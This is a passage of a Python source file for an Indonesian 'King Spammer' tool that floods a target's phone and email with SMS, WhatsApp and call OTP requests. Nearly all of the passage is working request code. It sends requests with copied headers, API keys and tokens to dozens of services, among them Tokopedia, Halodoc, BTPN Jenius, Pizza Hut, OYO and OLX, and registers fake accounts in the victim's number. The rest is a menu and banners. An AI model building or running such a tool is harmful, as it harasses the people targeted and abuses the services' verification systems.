			gw=requests.get("https://m.redbus.id/api/getOtp?number="+nomor+"&cc=62&whatsAppOpted=true&disableOtpFlow=undefined",headers=kepala).text
			headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}
			site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = headers).text
			search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
			datap = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}
			sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = headers, data = datap)
			Xen=requests.get("https://m.redbus.id/api/getOtp?number=0"+nomor+"&cc=62&whatsAppOpted=true",headers={"user-agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"}).text
			req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":nomor}).text
			ua={"Host":"auth.sampingan.co","domain-name":"auth-svc","app-auth":"Skip","content-type":"application/json; charset=UTF-8","user-agent":"okhttp/4.9.1","accept":"application/vnd.full+json","accept":"application/json","content-type":"application/vnd.full+json","content-type":"application/json","app-version":"2.1.2","app-platform":"Android"}
			data=json.dumps({"channel":"WA","country_code":"+62","phone_number":nomor})
			req=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
			requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
			Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
			Bn=requests.post("https://auth.sampingan.co/v1/otp",data=data,headers=ua).text
			requests.post("https://api.bukuwarung.com/api/v1/auth/otp/send",headers={"Accept":"application/json","X-APP-VERSION-NAME":"3.4.0","X-APP-VERSION-CODE":"3399","Content-Type":"application/json; charset=UTF-8","Host":"api.bukuwarung.com","Connection":"Keep-Alive","Accept-Encoding":"gzip","User-Agent":"Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"},json={"action":"LOGIN_OTP","countryCode":"62","deviceId":"00000177-142d-f1a2-bac4-57a9039fdc4d","method":"WA","phone":"0"+nomor}).text
			Xen=requests.post('https://wong.kitabisa.com/register/draft',headers={'Host': 'wong.kitabisa.com','x-ktbs-platform-name': 'pwa','version': '3.4.0','x-ktbs-time': '1648203783','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-ktbs-api-version': '1.0.0','accept': 'application/json','x-ktbs-client-name': 'kanvas','x-ktbs-client-version': '1.0.0','x-ktbs-request-id': '06ae8851-e195-41b3-96cb-688edef890cb','save-data': 'on','x-ktbs-signature': 'e722d9d654ab5f7b68801deaa251d80171f2729651a5ac52ca8ddee074e8f286'},json={"full_name":"Xenzi Ganz","username":"0"+nomor,"otp_type":"whatsapp"}).text
			spm=requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
			dekoruma={"Host":"auth.dekoruma.com","save-data":"on","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://m.dekoruma.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.dekoruma.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dekor=json.dumps({"phoneNumber":"+62"+nomor,"platform":"sms"})
			dekor2=requests.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",headers=dekoruma,data=dekor).text
			jenius=requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
			payfaz=requests.post("https://api.payfazz.com/v2/phoneVerifications",data={"phone":"0"+nomor},headers={"Host": "api.payfazz.com", "content-length": "17", "accept": "*/*", "origin": "https://www.payfazz.com","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "referer": "http://www.payfazz.com/register/BEN6ZF74XL", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
			xen8={'Host': 'www.halodoc.com','x-xsrf-token': '9F1AFC784408F11F0FCD3071E845FBEB52B13A6C8C5740172F9C526E0DCA9A69B37505EDB5FAF1C97C522F4B09AFCF2F7C89','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json, text/plain, */*','save-data': 'on','origin': 'https://www.halodoc.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			xen9=json.dumps({"phone_number": "+62"+nomor,"channel": "sms"})
			req4 = requests.post('https://www.halodoc.com/api/v1/users/authentication/otp/requests', headers=xen8,data=xen9).text
			xen6={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			xen7=json.dumps({"user": {"phone": "0"+nomor}})
			req3 = requests.post('https://www.alodokter.com/login-with-phone-number', headers=xen6,data=xen7).text
			pizza={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
			pizza2=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})
			pizzahut=requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers=pizza,data=pizza2).text
			lummo={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			gas=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})
			gaskeun=requests.post("https://api.tokko.io/graphql",headers=lummo,data=gas).text
			oyo={"Host":"www.oyorooms.com","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","xsrf-token":"EQkWLkwz-wsOdxssltZ6pIkc9OAbnpVBea-A","access_token":"SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","accept":"*/*","origin":"https://www.oyorooms.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.oyorooms.com/login","accept-encoding":"gzip, deflate, br"}
			oyo2=json.dumps({"phone":nomor,"country_code":"+62","country_iso_code":"ID","nod":4,"send_otp":True,"devise_role":"Consumer_Guest"})
			oyony=requests.post("https://www.oyorooms.com/api/pwa/generateByPhone?locale=id",headers=oyo,data=oyo2).text
			ganz={"Host":"wapi.ruparupa.com","content-type":"application/json","accept":"application/json","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36","user-platform":"desktop","x-frontend-type":"desktop","origin":"https://www.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			gamteng=json.dumps({"phone":"0"+nomor,"action":"social-login","channel":"message","email":"","token":"","customer_id":"0","is_resend":0})
			aing=requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers=ganz,data=gamteng).text
			jag2={"Host":"id.jagreward.com","Connection":"keep-alive","Accept":"*/*","User-Agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://id.jagreward.com/member/register/","Accept-Encoding":"gzip, deflate, br","Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			jag=requests.get("https://id.jagreward.com/member/verify-mobile/"+nomor+"/",headers=jag2).text
			Subs={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
			subrek=json.dumps({"phone":nomor,"captcha":""})
			mar=requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers=Subs,data=subrek).text
			AmmarGanz=requests.post("https://www.olx.co.id/api/auth/authenticate",data=json.dumps({"grantType": "retry","method": "sms","phone":"62"+nomor,"language": "id"}), headers={"accept": "*/*","x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=","x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json"}).text
			AmmarBN ={"Host":"beryllium.mapclub.com","content-type":"application/json","accept-language":"en-US","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin":"https://www.mapclub.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.mapclub.com/","accept-encoding":"gzip, deflate, br"}
			wkwk=json.dumps({"account":nomor})
			req = requests.post("https://beryllium.mapclub.com/api/member/registration/sms/otp",headers=AmmarBN,data=wkwk).text
			dat={"Host":"api.indodana.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.indodana.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.indodana.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			dat2=json.dumps({"email":mail})
			req=requests.post("https://api.indodana.com/services/athena/download-app/email",headers=dat,data=dat2).text
			moka={"Host":"service-goauth.mokapos.com","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://backoffice.mokapos.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://backoffice.mokapos.com/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			ata=json.dumps({"phone_number":"+62"+mail})
			gas=requests.post("https://service-goauth.mokapos.com/account/v1/verification/phone/send",headers=moka,data=ata).text
			olx={"Host":"www.olx.co.id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","save-data":"on","origin":"https://www.olx.co.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.olx.co.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			olx2=json.dumps({"grantType":"email","email":mail,"language":"id"})
			olx3=requests.post("https://www.olx.co.id/api/auth/authenticate",headers=olx,data=olx2).text
			shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
			shopm=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
			shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
			shopq=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
			shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
			shopw=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
			shop={"Host":"api.tokko.io","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","x-tokko-api-client":"merchant_web","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"}
			shopn={"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"}
			shope=requests.post("https://api.tokko.io/graphql",headers=shop,json=shopn).text
			print (f"{message}{R}'{W}Spammer Berhasil Terkirim{R}' {G}✓{W}")
	except requests.exceptions.SSLError:
		sys.exit(f"{W}Koneksi Tidak Stabil [{R}!{W}]")
	except requests.exceptions.ConnectionError:
		sys.exit(f"{W}Koneksi Tidak Stabil [{R}!{W}]")
	except KeyboardInterrupt:
                sys.exit(f"{W}Program Terminated [{R}!{W}]")
	except ValueError:
                print (f"{W}Masukkan Nomor Dengan Benar [{R}!{W}]")

def log():
	os.system("clear")
	print (f"""
{biru}╔									╗
{ungu}  ╦╔═{W} ┬ ┌┐┌ ┌─┐{R}     {G}╔═╗{W}┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐ {abu}|{R}•{W}Creator{R}:{W}AmmarBN
{ungu}  ╠╩╗{W} │ │││ │ ┬{R} ─── {G}╚═╗{W}├─┘├─┤││││││├┤ ├┬┘ {abu}|{R}•{W}Github {R}:{W}AmmarrBN
{ungu}  ╩ ╩{W} ┴ ┘└┘ └─┘{R}     {G}╚═╝{W}┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─ {abu}|{R}•{W}Youtube{R}:{W}Ammar Executed
{W}         King Spammer{Y}:{W} Spam SECW {R}({W}sms,email,call,wa{R})
{biru}╚									╝
{W}	1{R}.{W}Gass Spam
{W}        2{R}.{W}Jadwal Sholat
{W}	3{R}.{W}Supoort Admin
{W}	4{R}.{W}Bug Report
{W}	5{R}.{W}Exit Tools
""")

def log2():
	os.system("clear")
	print(f"""
{biru}╔                                                                 ╗
{ungu}  ╦╔═{W} ┬ ┌┐┌ ┌─┐{R}     {G}╔═╗{W}┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐ {abu}|{R}•{W}Creator{R}:{W}AmmarBN
{ungu}  ╠╩╗{W} │ │││ │ ┬{R} ─── {G}╚═╗{W}├─┘├─┤││││││├┤ ├┬┘ {abu}|{R}•{W}Github {R}:{W}AmmarrBN
{ungu}  ╩ ╩{W} ┴ ┘└┘ └─┘{R}     {G}╚═╝{W}┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─ {abu}|{R}•{W}Youtube{R}:{W}Ammar Executed
{R}  •>{W} Example{R}:{Y}8xx{R}),({W}Tidak Ush Masukkan Email Jika Tidak Spam Email{R})
{biru}╚                                                                 ╝
""")

def log3():
	os.system("clear")
	print(f"""
{biru}╔                                                                 ╗
{ungu}  ╦╔═{W} ┬ ┌┐┌ ┌─┐{R}     {G}╔═╗{W}┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐ {abu}|{R}•{W}Creator{R}:{W}AmmarBN
{ungu}  ╠╩╗{W} │ │││ │ ┬{R} ─── {G}╚═╗{W}├─┘├─┤││││││├┤ ├┬┘ {abu}|{R}•{W}Github {R}:{W}AmmarrBN
{ungu}  ╩ ╩{W} ┴ ┘└┘ └─┘{R}     {G}╚═╝{W}┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─ {abu}|{R}•{W}Youtube{R}:{W}Ammar Executed
{biru}╚                                                                 ╝
""")

def log0():
        os.system("clear")
        print(f"""
{biru}╔                                                                 ╗
{ungu}  ╦╔═{W} ┬ ┌┐┌ ┌─┐{R}     {G}╔═╗{W}┌─┐┌─┐┌┬┐┌┬┐┌─┐┬─┐ {abu}|{R}•{W}Creator{R}:{W}AmmarBN
{ungu}  ╠╩╗{W} │ │││ │ ┬{R} ─── {G}╚═╗{W}├─┘├─┤││││││├┤ ├┬┘ {abu}|{R}•{W}Github {R}:{W}AmmarrBN
{ungu}  ╩ ╩{W} ┴ ┘└┘ └─┘{R}     {G}╚═╝{W}┴  ┴ ┴┴ ┴┴ ┴└─┘┴└─ {abu}|{R}•{W}Youtube{R}:{W}Ammar Executed
{R}           •>{W} Info{R}:{Y}Tambahkan + untuk Spasi Contoh:Halo+Kak{R})
{biru}╚                                                                 ╝
""")

message=("\033[1;93m{\033[1;97mMessage\033[1;93m}\033[1;97m:")


def mulai():
	try:
		log()
		a=input(f"{R}•> {W}Select {R}:{W}")
		if a == "1":
			log2()
			spammer()
			ulang()
		if a == "2":
			log3()
			sholat_bree()
		if a == "3":
			log3()
			os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
			print (f"{Y}message{W}:{kuning}'terima kasih sudah support admin'")
			ulang()
		if a == "4":
			log0()
			lapor=input(f"{R}~> {W}Laporan{R}:{W}")
			os.system(f"xdg-open https://wa.me/6288229683561?text={lapor}")
			print (f"{W}Sukses Laporkan Bug {G}✓")
			ulang()
		if a == "5":
			print ("logout tools dalam 5 detik")
			down(5)
			print ("")
			os.system("cd")
			exit
	except KeyboardInterrupt:
		print (f"{W}Program Terminated [{R}!{W}]")
		time.sleep(3)
	except requests.exceptions.ConnectionError:
		sys.exit(f"{putih}Koneksi Tidak Stabil [{R}!{W}]")

def pro():
        mulai()
done = False
def loading():
    for c in itertools.cycle(['\033[1;37m[\033[31m•\033[1;37m] Starting tools.', '\033[1;37m[\033[31m•\033[1;37m] sTarting tools.. ', '\033[1;37m[\033[31m•\033[1;37m] stArting tools...  ', '\033[1;37m[\033[31m•\033[1;37m] staRting tools.... ', '\033[1;37m[\033[31m•\033[1;37m] starTing tools.....', '\033[1;37m[\033[31m•\033[1;37m] startIng tools...... ', '\033[1;37m[\033[31m•\033[1;37m] startiNg tools.  ', '\033[1;37m[\033[31m•\033[1;37m] startinG tools.. ', '\033[1;37m[\033[31m•\033[1;37m] starting Tools...', '\033[1;37m[\033[31m•\033[1;37m] starting tOols.... ', '\033[1;37m[\033[31m•\033[1;37m] starting toOls.....  ', '\033[1;37m[\033[31m•\033[1;37m] starting tooLs. ', '\033[1;37m[\033[31m•\033[1;37m] starting toolS..', '\033[1;37m[\033[31m•\033[1;37m] STARTING TOOLS... ', '\033[1;37m[\033[31m•\033[1;37m]   ', '\033[1;37m[\033[31m•\033[1;37m] STARTING TOOLS.... ', '\033[1;37m[\033[31m•\033[1;37m] ']):
        if done:
            break
        sys.stdout.write('\r'+c)
        sys.stdout.flush()
        time.sleep(0.2)
    sys.stdout.write('\r              ')
    print ("                                                ")
    pro()
t = threading.Thread(target=loading)
t.start()

time.sleep(4.60)
done = True
